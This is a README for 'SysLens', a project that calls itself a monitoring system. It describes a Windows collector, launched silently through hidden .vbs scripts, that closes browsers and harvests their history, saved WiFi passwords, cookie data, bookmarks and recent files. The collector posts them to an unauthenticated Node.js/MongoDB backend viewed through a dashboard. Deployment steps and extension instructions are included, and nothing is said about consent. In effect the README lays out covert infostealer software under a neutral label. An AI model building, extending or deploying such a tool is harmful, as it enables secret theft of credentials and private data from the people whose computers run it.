# SysLens

A full-stack remote data collection and monitoring system. A Windows-based collector gathers system telemetry and sends it incrementally to a Node.js/Express backend, which stores sessions in MongoDB Atlas. A React dashboard provides authenticated access to all collected data.

---

## Architecture

```
Windows Collector (BAT / PS1)
    |
    | HTTP POST (incremental, per data type)
    v
Backend API  (Node.js + Express + Mongoose)
    |
    | Mongoose ODM
    v
MongoDB Atlas
    ^
    | REST API (JWT-authenticated)
Frontend Dashboard  (React + Vite + Tailwind)
```

---

## Repository Structure

```
.
├── backend/                    # Express API server
│   ├── api/
│   │   └── index.js            # Vercel serverless entry point
│   ├── middleware/
│   ├── models/
│   │   ├── Admin.js
│   │   └── Session.js
│   ├── routes/
│   │   ├── auth.js             # JWT auth, setup, update password
│   │   └── data.js             # Data ingestion + session management
│   ├── server.js
│   └── vercel.json
├── Frontend/                   # React + Vite dashboard
│   ├── src/
│   │   ├── pages/
│   │   │   ├── Login.jsx
│   │   │   ├── Dashboard.jsx
│   │   │   └── SessionDetail.jsx
│   │   ├── components/
│   │   └── App.jsx
│   └── vercel.json
└── collector_enhanced_win/     # Windows collector scripts
    ├── launch.bat              # Batch collector
    ├── launch.ps1              # PowerShell collector (faster)
    ├── launch.vbs              # Silent launcher (BAT)
    ├── launch_ps.vbs           # Silent launcher (PS1, recommended)
    └── bin/
        ├── curl.exe
        ├── sqlite3.exe
        └── jq.exe
```

---

## Data Model

Each collector run creates one `Session` document:

| Field | Description |
|---|---|
| `session_id` | `YYYYMMDD_HHMMSS_RAND` — unique per run |
| `device_info` | hostname, username, domain, IP |
| `status` | `partial` or `complete` (complete when >= 5/8 types received) |
| `items_collected` | array tracking which types arrived |
| `data.chrome_history` | `url\|title\|visits\|chrome_timestamp` per entry |
| `data.brave_history` | same format as chrome |
| `data.edge_history` | same format as chrome |
| `data.wifi_passwords` | `[{network, password}]` |
| `data.system_info` | OS info + installed software |
| `data.bookmarks` | `{chrome: [], brave: [], edge: []}` |
| `data.cookies_info` | cookie counts per browser |
| `data.recent_files` | `[{name, location, date}]` — Downloads + Windows Recent |

---

## Local Development

### Prerequisites

- Node.js 18+
- MongoDB Atlas cluster (free tier works)
- npm

### Backend

```bash
cd backend
npm install
```

Create `backend/.env`:

```env
MONGODB_URI=mongodb+srv://<user>:<password>@cluster0.xxxxx.mongodb.net/syslens
JWT_SECRET=<generate with: openssl rand -base64 32>
FRONTEND_URL=http://localhost:5173
PORT=8080
```

```bash
npm start
```

First-time admin setup (run once):

```bash
curl -X POST http://localhost:8080/api/auth/setup \
  -H "Content-Type: application/json" \
  -d '{"password": "yourpassword"}'
```

### Frontend

```bash
cd Frontend
npm install
```

Create `Frontend/.env`:

```env
VITE_API_URL=http://localhost:8080/api
```

```bash
npm run dev
```

Dashboard available at `http://localhost:5173`.

---

## API Reference

All session endpoints require `Authorization: Bearer <token>`.

### Auth

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | `/api/auth/setup` | No | Create admin (first time only) |
| POST | `/api/auth/login` | No | Returns JWT token |
| GET | `/api/auth/verify` | Yes | Validates token |
| POST | `/api/auth/update` | No | Change password (requires old password) |

### Data Ingestion

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| POST | `/api/data` | No | Receive data from collector |

Request body:

```json
{
  "session_id": "20260108_225445_24544",
  "type": "chrome",
  "data": [...]
}
```

Supported types: `device_info`, `chrome`, `brave`, `edge`, `wifi`, `system`, `bookmarks`, `cookies`, `recent_files`

### Sessions

| Method | Endpoint | Auth | Description |
|---|---|---|---|
| GET | `/api/sessions` | Yes | List sessions (paginated) |
| GET | `/api/sessions/:id` | Yes | Full session detail |
| DELETE | `/api/sessions/:id` | Yes | Delete session |

---

## Collector

Two collectors are provided — same functionality, different performance.

### launch.bat (Batch)
Standard Windows batch script. Compatible with all Windows versions. Slower on large history sets due to batch loop I/O.

### launch.ps1 (PowerShell) — Recommended
Uses native PowerShell JSON serialization (`ConvertTo-Json`), 10x faster on large datasets. History is limited to 1000 most recent entries per browser.

### Silent Launchers (.vbs)

| File | Launches | Window |
|---|---|---|
| `launch.vbs` | `launch.bat` | Hidden |
| `launch_ps.vbs` | `launch.ps1` | Hidden |

Run the `.vbs` file — no console window appears.

### Collector Data Collection Order

1. Device info (hostname, user, IP)
2. Edge history (closes Edge first)
3. Brave history (closes Brave first)
4. Chrome history (closes Chrome first)
5. WiFi passwords
6. System info
7. Bookmarks
8. Cookie counts
9. Recent files (Downloads folder + Windows Quick Access)

### Browser Timestamp Format

Browser history timestamps use Chrome's epoch format (microseconds since 1601-01-01). The frontend converts them automatically for display.

---

## Deployment (Vercel)

### Backend

1. Push repo to GitHub
2. Import to Vercel, set **Root Directory** to `backend`
3. Set environment variables:
   - `MONGODB_URI`
   - `JWT_SECRET`
   - `FRONTEND_URL` (add after deploying frontend)
4. Deploy

### Frontend

1. Import to Vercel, set **Root Directory** to `Frontend`
2. Set environment variable:
   - `VITE_API_URL=https://your-backend.vercel.app/api`
3. Deploy
4. Go back to backend Vercel project, update `FRONTEND_URL` to the new frontend URL, redeploy

### Verify

```bash
curl https://your-backend.vercel.app/api/auth/verify
# Expected: {"error":"No token provided"}
```

---

## Extending

### Add a new data type

1. Add entry to `dataTypeMap` in `backend/routes/data.js`
2. Add field to `Session.data` schema in `backend/models/Session.js`
3. Update `expectedTypes` array for completion logic
4. Add a collection step in `launch.bat` / `launch.ps1`
5. Add rendering in `Frontend/src/pages/SessionDetail.jsx`

### Change JWT expiry

`JWT_EXPIRES_IN` constant in `backend/routes/auth.js` — update matching `sixHours` calculation in `Frontend/src/App.jsx`.

---

## Security Notes

- The `/api/data` endpoint intentionally has no authentication to allow the collector to post without credentials.
- The `JWT_SECRET` must be a strong random value in production. Generate with: `openssl rand -base64 32`
- MongoDB Atlas IP allowlist should be restricted in production.
- The `.env` file is gitignored — never commit credentials.
